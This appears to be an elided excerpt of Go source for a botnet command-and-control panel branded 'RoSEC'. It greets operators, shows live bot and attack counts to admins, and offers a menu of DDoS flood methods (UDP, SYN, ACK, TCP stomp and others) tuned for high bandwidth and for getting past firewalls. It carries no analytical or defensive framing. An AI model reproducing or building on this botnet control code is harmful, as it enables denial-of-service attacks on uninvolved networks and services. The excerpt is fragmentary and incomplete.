...
func (this *Admin) Handle() {
    ...
    this.conn.Write([]byte("\x1b[1;37mWelcome to RoSEC | 地獄へようこそ\r\n"))
    this.conn.Write([]byte("\x1b[1;37m\r\n"))
    this.conn.Write([]byte("\x1b[1;37m       _,    _   _    ,_\r\n"))
    this.conn.Write([]byte("\x1b[1;37m  .o888P     Y8o8Y     Y888o.\r\n"))
    this.conn.Write([]byte("\x1b[1;37m d88888      88888      88888b\r\n"))
    this.conn.Write([]byte("\x1b[1;37md888888b_  _d88888b_  _d888888b\r\n"))
    this.conn.Write([]byte("\x1b[1;37m8888888888888888888888888888888\r\n"))
    this.conn.Write([]byte("\x1b[1;37m8888888888888888888888888888888\r\n"))
    this.conn.Write([]byte("\x1b[1;37mYJGS8P"Y888P"Y888P"Y888P"Y8888P\r\n"))
    this.conn.Write([]byte("\x1b[1;37m Y888   '8'   Y8P   '8'   888Y\r\n"))
    this.conn.Write([]byte("\x1b[1;37m  '8o          V          o8'\r\n"))
    this.conn.Write([]byte("\x1b[1;37m    `                     `\r\n"))
    ...
    go func() {
        ...
        for {
            ...
            if userInfo.admin == 1 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded: %d | Admins: %d | User: %d | Ongoing %d/1\007", BotCount, database.totalAdmins(), database.totalUsers(), database.runningatk()))); err != nil {
                    this.conn.Close()
                    break
                }
            }
    ...
    for {
        ...
        var botCount int
        this.conn.Write([]byte("\x1b[1;37m" + username + "@\x1b[0;36mRoSEC\x1b[1;37m# "))
    ...
    this.conn.Write([]byte("\r\n"))
        ...
        if cmd == "help" || cmd == "HELP" || cmd == "?"  || cmd == "methods" {
            ...
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;37m.udp \x1b[0;36mUDP Flood Optimized For High GBPS\x1b[1;37m.\r\n"))
            this.conn.Write([]byte("\x1b[1;37m.std \x1b[0;36mSTD HEX Flood\x1b[1;37m.\r\n"))
            this.conn.Write([]byte("\x1b[1;37m.syn \x1b[0;36mSYN Flood\x1b[1;37m.\r\n"))
            this.conn.Write([]byte("\x1b[1;37m.ack \x1b[0;36mACK Flood\x1b[1;37m.\r\n"))
            this.conn.Write([]byte("\x1b[1;37m.pps \x1b[0;36mUDP Flood Optimized for High PPS\x1b[1;37m.\r\n"))
            this.conn.Write([]byte("\x1b[1;37m.tcp \x1b[0;36mTCP Flood Optimized For Firewall Targets\x1b[1;37m.\r\n"))
            this.conn.Write([]byte("\x1b[1;37m.stomp \x1b[0;36mTCP Stomp Flood Optimized For Firewall Targets\x1b[1;37m.\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        ...
        if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;37mAdmin Panel | RoSEC Management\x1b[1;31m:\r\n"))
            this.conn.Write([]byte("\r\n"))
